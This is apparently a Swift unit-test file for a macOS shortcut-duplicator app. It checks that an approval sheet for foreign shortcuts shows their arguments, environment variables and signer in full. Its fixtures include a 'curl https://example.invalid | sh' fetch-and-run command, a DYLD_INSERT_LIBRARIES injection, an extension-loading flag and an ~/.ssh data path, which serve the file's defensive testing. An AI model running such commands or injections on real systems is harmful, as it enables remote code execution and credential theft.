import XCTest
@testable import DuplicatorCore
@testable import MacAppDuplicator

/// C3: the review sheet shows everything a foreign shortcut would run once it is signed as the user's own, in full and
/// unmasked.
final class ForeignShortcutApprovalTests: XCTestCase {
    private var dir: URL!

    override func setUpWithError() throws {
        dir = try makeAppTemporaryDirectory()
    }

    override func tearDownWithError() throws {
        try FileManager.default.removeItem(at: dir)
    }

    /// An unsigned, tokenless bundle scanned with the default trust: foreign, reason "no install token; ..." (nothing to verify against).
    private func approval(_ config: ShortcutConfig, signature: CodeSignature = .unknown) throws -> ForeignShortcutApproval {
        let bundle = try writeShortcutBundle(named: "Planted", in: dir, config: makeConfig(name: "Planted"))
        let record = try LibraryScanner.record(forBundleAt: bundle)
        return ForeignShortcutApproval(record: record, config: config, signature: signature)
    }

    func testAnAppShortcutIsShownInFullWithSecretsUnmasked() throws {
        var config = makeConfig(name: "Planted", targetPath: "/Applications/Target.app")
        config.arguments = ["--load-extension=/tmp/evil", "--remote-debugging-port=9222"]
        config.environment = ["OPENAI_API_KEY": "sk-live-secret", "DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"]
        config.dataPath = "/Users/someone/.ssh"
        config.eraseOnQuit = true

        let shown = try approval(config)

        XCTAssertEqual(shown.reason, "no install token; an ad hoc signature cannot show who built it")
        XCTAssertEqual(shown.kindDescription, "App")
        XCTAssertEqual(shown.targetDescription, "/Applications/Target.app")
        XCTAssertEqual(shown.argumentLines, ["--load-extension=/tmp/evil", "--remote-debugging-port=9222"])
        XCTAssertEqual(shown.environmentLines, ["DYLD_INSERT_LIBRARIES=/tmp/x.dylib", "OPENAI_API_KEY=sk-live-secret"],
                       "every variable, sorted, value in full")
        XCTAssertEqual(shown.dataPathDescription, "/Users/someone/.ssh")
        XCTAssertEqual(shown.eraseOnQuitDescription, "On")
    }

    func testDefaultsAndEveryOtherKindShowWhatTheyRun() throws {
        var plain = makeConfig(name: "Plain")
        plain.dataPath = nil
        plain.eraseOnQuit = false
        let shownPlain = try approval(plain)
        XCTAssertEqual(shownPlain.dataPathDescription, "Default")
        XCTAssertEqual(shownPlain.eraseOnQuitDescription, "Off")
        XCTAssertEqual(shownPlain.environmentLines, [])
        XCTAssertEqual(shownPlain.argumentLines, [])

        var command = makeConfig(name: "Tool", kind: .cli)
        command.cli = CLIConfig(executablePath: "/bin/sh", arguments: ["-c", "curl https://example.invalid | sh"])
        command.arguments = ["--extra"]
        let shownCommand = try approval(command)
        XCTAssertEqual(shownCommand.kindDescription, "Command")
        XCTAssertEqual(shownCommand.targetDescription, "/bin/sh")
        XCTAssertEqual(shownCommand.argumentLines, ["-c", "curl https://example.invalid | sh", "--extra"])

        var file = makeConfig(name: "Doc", kind: .file)
        file.file = FileConfig(path: "/Users/someone/doc.txt", openerAppPath: "/Applications/Opener.app")
        let shownFile = try approval(file)
        XCTAssertEqual(shownFile.kindDescription, "File")
        XCTAssertEqual(shownFile.targetDescription, "/Users/someone/doc.txt, opened with /Applications/Opener.app")

        let web = makeWebShortcutConfig(name: "Chat", dataStoreID: UUID())
        let shownWeb = try approval(web)
        XCTAssertEqual(shownWeb.kindDescription, "Web App")
        XCTAssertEqual(shownWeb.targetDescription, try XCTUnwrap(web.webApp?.url))
    }

    func testSignerNamesTheCertificateOrSaysThereIsNone() throws {
        let config = makeConfig(name: "Signed")
        XCTAssertEqual(try approval(config, signature: .identity("Developer ID Application: Mallory (ABCDE12345)")).signerDescription,
                       "Developer ID Application: Mallory (ABCDE12345)")
        XCTAssertEqual(try approval(config, signature: .adHoc).signerDescription, "Ad hoc (no signing identity)")
        XCTAssertEqual(try approval(config, signature: .unknown).signerDescription, "Unsigned, or the signature could not be read")
    }
}
